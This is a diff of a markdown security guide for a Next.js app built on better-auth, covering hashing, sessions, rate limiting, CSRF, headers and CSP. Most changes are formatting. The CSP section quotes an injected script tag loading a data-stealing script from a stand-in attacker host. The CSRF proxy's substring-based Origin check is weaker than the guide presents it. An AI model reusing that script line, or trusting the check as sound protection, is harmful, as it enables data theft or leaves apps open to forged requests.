@@ -29,23 +29,25 @@ better-auth uses **scrypt** by default, which is more secure than bcrypt for pas
 
 ```typescript
 // lib/auth/config.ts
-import { betterAuth } from 'better-auth'
+import { betterAuth } from 'better-auth';
 
 export const auth = betterAuth({
   emailAndPassword: {
     enabled: true,
     // Uses scrypt by default - no configuration needed
     // Default parameters: N=32768, r=8, p=1, keylen=64
-  }
-})
+  },
+});
 ```
 
 **scrypt vs bcrypt**:
+
 - **scrypt**: Memory-hard (requires significant RAM), more resistant to ASIC/GPU attacks
 - **bcrypt**: CPU-hard only, vulnerable to specialized hardware
 - **Performance**: Both intentionally slow (~150-300ms per hash)
 
 **Protection Against**:
+
 - **Rainbow Tables**: Unique salt per password prevents precomputed hash tables
 - **Brute Force**: Memory-hard algorithm makes each guess expensive
 - **Timing Attacks**: Constant-time comparison built into scrypt/bcrypt
@@ -65,17 +67,19 @@ export const auth = betterAuth({
       enabled: true,
       maxAge: 60 * 5, // 5 minutes cookie cache
     },
-  }
-})
+  },
+});
 ```
 
 **Session Strategy**:
+
 - **Primary**: Database-backed sessions (can be revoked server-side)
 - **Cache**: Short-lived cookie cache (5 minutes) for performance
 - **Cookies**: HTTP-only, Secure, SameSite=Lax by default
 
 **Cookie Configuration**:
 better-auth automatically sets secure cookie defaults:
+
 ```typescript
 // Automatic configuration (no code needed)
 {
@@ -95,10 +99,10 @@ export const auth = betterAuth({
     cookieCache: {
       enabled: true,
       maxAge: 5 * 60, // 5 minutes
-      strategy: 'compact' // or 'jwt' or 'jwe'
-    }
-  }
-})
+      strategy: 'compact', // or 'jwt' or 'jwe'
+    },
+  },
+});
 ```
 
 - **compact**: Smallest size, basic encoding
@@ -106,6 +110,7 @@ export const auth = betterAuth({
 - **jwe**: JSON Web Encryption, most secure (encrypted payload)
 
 **Protection Against**:
+
 - **XSS**: `httpOnly: true` prevents JavaScript from accessing cookies
 - **CSRF**: `sameSite: 'lax'` blocks cross-site cookie sending + built-in CSRF tokens
 - **Man-in-the-Middle**: `secure: true` requires HTTPS in production
@@ -113,31 +118,34 @@ export const auth = betterAuth({
 - **Session Hijacking**: Database sessions can be revoked immediately
 
 **Session Revocation**:
+
 ```typescript
 // Revoke all sessions on password change
 await authClient.changePassword({
   newPassword: newPassword,
   currentPassword: currentPassword,
-  revokeOtherSessions: true // Force re-auth on all devices
-})
+  revokeOtherSessions: true, // Force re-auth on all devices
+});
 
 // Manual session revocation
 await authClient.signOut({
   fetchOptions: {
     onSuccess: () => {
       // All sessions for this user are revoked
-    }
-  }
-})
+    },
+  },
+});
 ```
 
 **Environment Validation**:
+
 ```typescript
 // Enforce strong secret in production
-if (process.env.NODE_ENV === 'production' &&
-    (!process.env.BETTER_AUTH_SECRET ||
-     process.env.BETTER_AUTH_SECRET.length < 32)) {
-  throw new Error('BETTER_AUTH_SECRET must be at least 32 characters')
+if (
+  process.env.NODE_ENV === 'production' &&
+  (!process.env.BETTER_AUTH_SECRET || process.env.BETTER_AUTH_SECRET.length < 32)
+) {
+  throw new Error('BETTER_AUTH_SECRET must be at least 32 characters');
 }
 ```
 
@@ -147,48 +155,48 @@ if (process.env.NODE_ENV === 'production' &&
 
 ```typescript
 // lib/security/rate-limit.ts
-import { LRUCache } from 'lru-cache'
+import { LRUCache } from 'lru-cache';
 
 type RateLimitOptions = {
-  interval: number // Time window in ms
-  uniqueTokenPerInterval: number // Max unique IPs to track
-}
+  interval: number; // Time window in ms
+  uniqueTokenPerInterval: number; // Max unique IPs to track
+};
 
 export function rateLimit(options: RateLimitOptions) {
   const tokenCache = new LRUCache({
     max: options.uniqueTokenPerInterval,
     ttl: options.interval,
-  })
+  });
 
   return {
     check: (limit: number, token: string): { success: boolean; remaining: number } => {
-      const tokenCount = (tokenCache.get(token) as number) || 0
+      const tokenCount = (tokenCache.get(token) as number) || 0;
 
       if (tokenCount >= limit) {
-        return { success: false, remaining: 0 }
+        return { success: false, remaining: 0 };
       }
 
-      tokenCache.set(token, tokenCount + 1)
-      return { success: true, remaining: limit - tokenCount - 1 }
+      tokenCache.set(token, tokenCount + 1);
+      return { success: true, remaining: limit - tokenCount - 1 };
     },
-  }
+  };
 }
 
 // Usage in API routes
 const limiter = rateLimit({
   interval: 60 * 1000, // 1 minute
   uniqueTokenPerInterval: 500, // Max 500 unique IPs per minute
-})
+});
 
 export async function POST(request: NextRequest) {
-  const ip = request.ip ?? request.headers.get('x-forwarded-for') ?? '127.0.0.1'
-  const { success } = limiter.check(5, ip) // 5 requests per minute per IP
+  const ip = request.ip ?? request.headers.get('x-forwarded-for') ?? '127.0.0.1';
+  const { success } = limiter.check(5, ip); // 5 requests per minute per IP
 
   if (!success) {
     return Response.json(
       { success: false, error: { message: 'Too many requests' } },
       { status: 429 }
-    )
+    );
   }
 
   // Process request
@@ -196,12 +204,14 @@ export async function POST(request: NextRequest) {
 ```
 
 **Configuration by Endpoint**:
+
 - Login: 5 attempts per minute per IP
 - Signup: 3 attempts per minute per IP
 - Password reset: 3 attempts per 15 minutes per IP
 - API endpoints: 100 requests per minute per authenticated user
 
 **Protection Against**:
+
 - Brute force attacks
 - Credential stuffing
 - API abuse
@@ -210,9 +220,10 @@ export async function POST(request: NextRequest) {
 ### 4. Input Validation & Sanitization
 
 **Zod Validation** (all inputs):
+
 ```typescript
 // lib/validations/auth.ts
-import { z } from 'zod'
+import { z } from 'zod';
 
 export const passwordSchema = z
   .string()
@@ -221,7 +232,7 @@ export const passwordSchema = z
   .regex(/[A-Z]/, 'Must contain uppercase letter')
   .regex(/[a-z]/, 'Must contain lowercase letter')
   .regex(/[0-9]/, 'Must contain number')
-  .regex(/[^A-Za-z0-9]/, 'Must contain special character')
+  .regex(/[^A-Za-z0-9]/, 'Must contain special character');
 
 export const signInSchema = z.object({
   email: z
@@ -231,31 +242,29 @@ export const signInSchema = z.object({
     .max(255)
     .toLowerCase()
     .trim(),
-  password: z
-    .string()
-    .min(1, 'Password is required')
-    .max(100), // Prevent excessive input
-})
+  password: z.string().min(1, 'Password is required').max(100), // Prevent excessive input
+});
 
 // Always validate in API routes
 export async function POST(request: Request) {
-  const body = await request.json()
+  const body = await request.json();
 
   try {
-    const validatedData = signInSchema.parse(body)
+    const validatedData = signInSchema.parse(body);
     // Continue with validated data
   } catch (error) {
     if (error instanceof z.ZodError) {
       return Response.json(
         { success: false, error: { message: 'Validation failed', details: error.errors } },
         { status: 400 }
-      )
+      );
     }
   }
 }
 ```
 
 **Protection Against**:
+
 - SQL Injection: Prisma uses parameterized queries, Zod validates types
 - XSS: React auto-escapes, Content-Security-Policy headers
 - NoSQL Injection: Type validation prevents malicious operators
@@ -265,6 +274,7 @@ export async function POST(request: Request) {
 
 **better-auth Built-in**:
 better-auth includes automatic CSRF protection via:
+
 - CSRF tokens in state-changing requests
 - SameSite cookie attribute
 - Origin header validation
@@ -272,9 +282,9 @@ better-auth includes automatic CSRF protection via:
 ```typescript
 // Automatic CSRF protection (no configuration needed)
 // app/api/auth/[...all]/route.ts
-import { auth } from '@/lib/auth/config'
+import { auth } from '@/lib/auth/config';
 
-export const { GET, POST } = auth.handler
+export const { GET, POST } = auth.handler;
 // better-auth automatically:
 // 1. Generates CSRF tokens
 // 2. Validates tokens on POST/PUT/DELETE requests
@@ -282,23 +292,24 @@ export const { GET, POST } = auth.handler
 ```
 
 **Additional Protection via Proxy** (Next.js 16):
+
 ```typescript
 // proxy.ts
-import { NextResponse } from 'next/server'
-import type { NextRequest } from 'next/server'
+import { NextResponse } from 'next/server';
+import type { NextRequest } from 'next/server';
 
 export function proxy(request: NextRequest) {
   // Validate Origin for state-changing requests
   if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(request.method)) {
-    const origin = request.headers.get('origin')
-    const host = request.headers.get('host')
+    const origin = request.headers.get('origin');
+    const host = request.headers.get('host');
 
     if (origin && !origin.includes(host || '')) {
-      return new NextResponse('Forbidden', { status: 403 })
+      return new NextResponse('Forbidden', { status: 403 });
     }
   }
 
-  return NextResponse.next()
+  return NextResponse.next();
 }
 ```
 
@@ -307,41 +318,36 @@ export function proxy(request: NextRequest) {
 ### 6. Security Headers
 
 **Implementation via proxy** (Next.js 16):
+
 ```typescript
 // proxy.ts
 export function proxy(request: NextRequest) {
   // ... authentication checks ...
 
   // Add security headers to all responses
-  const response = NextResponse.next()
+  const response = NextResponse.next();
 
   // Prevent clickjacking
-  response.headers.set('X-Frame-Options', 'DENY')
+  response.headers.set('X-Frame-Options', 'DENY');
 
   // Prevent MIME type sniffing
-  response.headers.set('X-Content-Type-Options', 'nosniff')
+  response.headers.set('X-Content-Type-Options', 'nosniff');
 
   // Enable XSS filter (legacy browsers)
-  response.headers.set('X-XSS-Protection', '1; mode=block')
+  response.headers.set('X-XSS-Protection', '1; mode=block');
 
   // Control referrer information
-  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin')
+  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
 
   // Permissions policy - disable unnecessary features
-  response.headers.set(
-    'Permissions-Policy',
-    'geolocation=(), microphone=(), camera=()'
-  )
+  response.headers.set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
 
   // Force HTTPS in production
   if (process.env.NODE_ENV === 'production') {
-    response.headers.set(
-      'Strict-Transport-Security',
-      'max-age=31536000; includeSubDomains'
-    )
+    response.headers.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
   }
 
-  return response
+  return response;
 }
 ```
 
@@ -356,6 +362,7 @@ Content-Security-Policy is a security header that tells browsers what resources 
 
 **Why Next.js Development Mode Conflicts with Strict CSP:**
 Next.js development features that violate strict CSP:
+
 - **Hot Module Replacement (HMR)**: Uses `eval()` requiring `'unsafe-eval'`
 - **Inline Scripts**: Next.js injects inline scripts for hydration requiring `'unsafe-inline'`
 - **Dynamic Style Injection**: Fast Refresh injects inline styles requiring `'unsafe-inline'`
@@ -368,34 +375,36 @@ Use different CSP policies for development and production:
 export function proxy(request: NextRequest) {
   // ... other code ...
 
-  const response = NextResponse.next()
+  const response = NextResponse.next();
 
   // Environment-specific CSP
-  const csp = process.env.NODE_ENV === 'production'
-    ? // Production: Strict policy
-      "default-src 'self'; " +
-      "script-src 'self'; " +
-      "style-src 'self'; " +
-      "img-src 'self' data: https:; " +
-      "font-src 'self' data:; " +
-      "connect-src 'self'; " +
-      "frame-ancestors 'none';"
-    : // Development: Permissive policy for Next.js
-      "default-src 'self'; " +
-      "script-src 'self' 'unsafe-eval' 'unsafe-inline'; " +
-      "style-src 'self' 'unsafe-inline'; " +
-      "img-src 'self' data: https:; " +
-      "font-src 'self' data:; " +
-      "connect-src 'self' webpack://*;"
+  const csp =
+    process.env.NODE_ENV === 'production'
+      ? // Production: Strict policy
+        "default-src 'self'; " +
+        "script-src 'self'; " +
+        "style-src 'self'; " +
+        "img-src 'self' data: https:; " +
+        "font-src 'self' data:; " +
+        "connect-src 'self'; " +
+        "frame-ancestors 'none';"
+      : // Development: Permissive policy for Next.js
+        "default-src 'self'; " +
+        "script-src 'self' 'unsafe-eval' 'unsafe-inline'; " +
+        "style-src 'self' 'unsafe-inline'; " +
+        "img-src 'self' data: https:; " +
+        "font-src 'self' data:; " +
+        "connect-src 'self' webpack://*;";
 
-  response.headers.set('Content-Security-Policy', csp)
+  response.headers.set('Content-Security-Policy', csp);
 
   // ... other headers ...
-  return response
+  return response;
 }
 ```
 
 **CSP Directives Explained:**
+
 - `default-src 'self'` - Only load resources from same origin by default
 - `script-src 'self'` - Only execute scripts from same origin (blocks injected scripts)
 - `'unsafe-eval'` - Allows `eval()` (dev only, for HMR)
@@ -404,6 +413,7 @@ export function proxy(request: NextRequest) {
 - `frame-ancestors 'none'` - Prevent iframe embedding (replaces X-Frame-Options)
 
 **Attack Prevention Example:**
+
 ```html
 <!-- Without CSP: This injected script runs -->
 <script src="https://evil.com/steal-data.js"></script>
@@ -417,15 +427,16 @@ Instead of `'unsafe-inline'`, use nonces for inline scripts:
 
 ```typescript
 // Generate unique nonce per request
-const nonce = crypto.randomBytes(16).toString('base64')
+const nonce = crypto.randomBytes(16).toString('base64');
 
-const csp = `script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'`
+const csp = `script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'`;
 
 // Pass nonce to Next.js pages for inline scripts
 // <script nonce={nonce}>...</script>
 ```
 
 **Why CSP is Critical:**
+
 - **XSS Defense**: Primary protection against cross-site scripting
 - **Data Injection Prevention**: Blocks unauthorized resource loading
 - **Clickjacking Protection**: `frame-ancestors` directive replaces X-Frame-Options
@@ -438,55 +449,58 @@ Monitor CSP violations in production:
 const csp =
   "default-src 'self'; " +
   "script-src 'self'; " +
-  "report-uri /api/csp-report; " +
-  "report-to csp-endpoint"
+  'report-uri /api/csp-report; ' +
+  'report-to csp-endpoint';
 
 // Create endpoint to receive reports
 // app/api/csp-report/route.ts
 export async function POST(request: Request) {
-  const report = await request.json()
+  const report = await request.json();
   // Log or store CSP violations
-  console.warn('CSP Violation:', report)
-  return new Response(null, { status: 204 })
+  console.warn('CSP Violation:', report);
+  return new Response(null, { status: 204 });
 }
 ```
 
 ### 8. Password Reset Security
 
 **Token Generation**:
+
 ```typescript
-import { randomBytes } from 'crypto'
+import { randomBytes } from 'crypto';
 
 // Cryptographically secure random token
-const token = randomBytes(32).toString('hex') // 64 character hex string
+const token = randomBytes(32).toString('hex'); // 64 character hex string
 
 // Store in verification table (better-auth handles this)
 // Tokens are automatically hashed and expire after configured time
 ```
 
 **Timing Attack Prevention**:
+
 ```typescript
 // app/api/auth/reset-request/route.ts
 export async function POST(request: Request) {
-  const { email } = await request.json()
+  const { email } = await request.json();
 
-  const user = await prisma.user.findUnique({ where: { email } })
+  const user = await prisma.user.findUnique({ where: { email } });
 
   // ALWAYS return success (prevent email enumeration)
   if (!user) {
     // Simulate processing time to prevent timing attacks
-    await new Promise(resolve => setTimeout(resolve, 100))
-    return Response.json({ success: true })
+    await new Promise((resolve) => setTimeout(resolve, 100));
+    return Response.json({ success: true });
   }
 
   // Generate token and send email
-  await generateTokenAndSendEmail(user)
+  await generateTokenAndSendEmail(user);
 
-  return Response.json({ success: true })
+  return Response.json({ success: true });
 }
 ```
 
 **Protection Against**:
+
 - Email enumeration (can't determine if email exists)
 - Token prediction (cryptographically random)
 - Token replay (single use via verification table)
@@ -498,6 +512,7 @@ export async function POST(request: Request) {
 better-auth automatically generates and validates state parameters to prevent CSRF in OAuth flows.
 
 **OAuth Configuration**:
+
 ```typescript
 // lib/auth/config.ts
 export const auth = betterAuth({
@@ -507,14 +522,15 @@ export const auth = betterAuth({
       clientSecret: process.env.GOOGLE_CLIENT_SECRET || '',
       enabled: !!(process.env.GOOGLE_CLIENT_ID && process.env.GOOGLE_CLIENT_SECRET),
     },
-  }
-})
+  },
+});
 ```
 
 **Callback URL Validation**:
 better-auth validates redirect URLs to prevent open redirect vulnerabilities.
 
 **Protection Against**:
+
 - Open redirect vulnerabilities
 - OAuth authorization code interception
 - State parameter CSRF attacks
@@ -546,6 +562,7 @@ GOOGLE_CLIENT_SECRET="secret-value-not-in-repo"
 ### 2. Password Policy
 
 Enforced via Zod schema (see Input Validation section above):
+
 - Minimum 8 characters
 - Maximum 100 characters
 - At least one uppercase letter
@@ -559,8 +576,8 @@ Enforced via Zod schema (see Input Validation section above):
 
 ```typescript
 // lib/auth/account-lockout.ts
-const MAX_FAILED_ATTEMPTS = 5
-const LOCKOUT_DURATION = 15 * 60 * 1000 // 15 minutes
+const MAX_FAILED_ATTEMPTS = 5;
+const LOCKOUT_DURATION = 15 * 60 * 1000; // 15 minutes
 
 export async function checkAccountLockout(email: string): Promise<boolean> {
   const attempts = await prisma.loginAttempt.count({
@@ -569,22 +586,22 @@ export async function checkAccountLockout(email: string): Promise<boolean> {
       createdAt: { gte: new Date(Date.now() - LOCKOUT_DURATION) },
       success: false,
     },
-  })
+  });
 
-  return attempts >= MAX_FAILED_ATTEMPTS
+  return attempts >= MAX_FAILED_ATTEMPTS;
 }
 
 export async function recordLoginAttempt(email: string, success: boolean) {
   await prisma.loginAttempt.create({
     data: { email, success, createdAt: new Date() },
-  })
+  });
 
   // Clean up old attempts
   await prisma.loginAttempt.deleteMany({
     where: {
       createdAt: { lt: new Date(Date.now() - LOCKOUT_DURATION) },
     },
-  })
+  });
 }
 ```
 
@@ -606,7 +623,7 @@ export async function logAuthEvent(
       userAgent: metadata?.userAgent as string,
       timestamp: new Date(),
     },
-  })
+  });
 }
 
 // Usage in auth callbacks
@@ -614,7 +631,7 @@ await logAuthEvent('login', user.id, {
   ip: request.ip,
   userAgent: request.headers.get('user-agent'),
   provider: 'credentials',
-})
+});
 ```
 
 ## Vulnerability Scanning
@@ -658,6 +675,7 @@ npm audit fix --force
 5. Enable session revocation on password change
 
 **Database Session Revocation**:
+
 ```sql
 -- Revoke all sessions for a user
 DELETE FROM session WHERE userId = 'user-id';
@@ -677,8 +695,10 @@ DELETE FROM session;
 ## Decision History & Trade-offs
 
 ### scrypt vs bcrypt for Password Hashing
+
 **Decision**: Use scrypt (better-auth default)
 **Security Implications**:
+
 - **Pro**: Memory-hard algorithm, resistant to ASIC/GPU attacks
 - **Pro**: More secure than bcrypt against specialized hardware
 - **Pro**: Configurable memory cost for future-proofing
@@ -688,8 +708,10 @@ DELETE FROM session;
 **Why scrypt?**: Modern best practice, recommended by security experts over bcrypt for new applications.
 
 ### Database Sessions vs Pure JWT
+
 **Decision**: Database sessions with cookie cache (hybrid)
 **Security Implications**:
+
 - **Pro**: Can revoke sessions server-side immediately
 - **Pro**: Session data not exposed in JWT
 - **Pro**: More control over session lifecycle
@@ -699,16 +721,20 @@ DELETE FROM session;
 **Why hybrid?**: Best of both worlds - security of database sessions with performance of short-lived cache.
 
 ### Session Expiry (30 days)
+
 **Decision**: 30-day session expiry with 24-hour update age
 **Rationale**:
+
 - Balance between security and user experience
 - Sessions update every 24 hours when active
 - Inactive sessions expire after 30 days
 - Can be adjusted per deployment needs
 
 ### Rate Limiting Strategy
+
 **Decision**: In-memory LRU cache vs Redis
 **Rationale**:
+
 - Simpler deployment (no Redis dependency)
 - Sufficient for single-server deployment
 - Upgrade to Redis when horizontal scaling needed
@@ -716,9 +742,11 @@ DELETE FROM session;
 **Trade-offs**: Limits reset on server restart, not shared across instances
 
 ### Cookie Cache Strategy
+
 **Decision**: "compact" encoding (default)
 **Alternatives**: "jwt" or "jwe"
 **Rationale**:
+
 - Smallest cookie size
 - Sufficient security with HTTPS
 - Can upgrade to "jwe" (encrypted) if needed
@@ -730,29 +758,29 @@ DELETE FROM session;
 For advanced use cases, better-auth supports Redis-backed sessions:
 
 ```typescript
-import { betterAuth } from 'better-auth'
-import { redis } from './redis'
+import { betterAuth } from 'better-auth';
+import { redis } from './redis';
 
 export const auth = betterAuth({
   secondaryStorage: {
     get: async (key) => await redis.get(key),
     set: async (key, value, ttl) => await redis.set(key, value, 'EX', ttl),
-    delete: async (key) => await redis.del(key)
+    delete: async (key) => await redis.del(key),
   },
   session: {
     cookieCache: {
       maxAge: 5 * 60, // 5 minutes
-      refreshCache: false // Disable stateless refresh
-    }
-  }
-})
+      refreshCache: false, // Disable stateless refresh
+    },
+  },
+});
 ```
 
 ### API Key Security (if using API key plugin)
 
 ```typescript
-import { betterAuth } from 'better-auth'
-import { apiKey } from 'better-auth/plugins'
+import { betterAuth } from 'better-auth';
+import { apiKey } from 'better-auth/plugins';
 
 export const auth = betterAuth({
   plugins: [
@@ -761,7 +789,7 @@ export const auth = betterAuth({
       disableKeyHashing: false, // Recommended: keep keys hashed
     }),
   ],
-})
+});
 ```
 
 ## Related Documentation
